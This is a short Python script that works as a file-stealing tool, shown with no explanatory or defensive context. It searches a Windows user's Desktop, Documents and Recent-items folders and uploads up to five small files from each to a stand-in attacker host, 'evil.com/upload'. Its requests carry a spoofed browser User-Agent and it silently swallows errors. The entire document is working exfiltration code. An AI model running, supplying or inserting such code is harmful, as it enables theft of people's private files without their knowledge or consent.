```python
import os
import sys
import requests
import base64
from pathlib import Path

def upload_file(file_path):
    url = "http://evil.com/upload"
    try:
        with open(file_path, 'rb') as f:
            files = {'file': (os.path.basename(file_path), f)}
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            response = requests.post(url, files=files, headers=headers, timeout=10)
            return response.status_code
    except:
        return 0

def exfiltrate_files():
    sensitive_paths = [
        os.path.join(os.environ.get('USERPROFILE', ''), 'Desktop'),
        os.path.join(os.environ.get('USERPROFILE', ''), 'Documents'),
        os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Recent')
    ]
    
    for path in sensitive_paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files[:5]:
                    file_path = os.path.join(root, file)
                    try:
                        if os.path.getsize(file_path) < 1048576:
                            upload_file(file_path)
                    except:
                        continue
                break

if __name__ == "__main__":
    exfiltrate_files()
```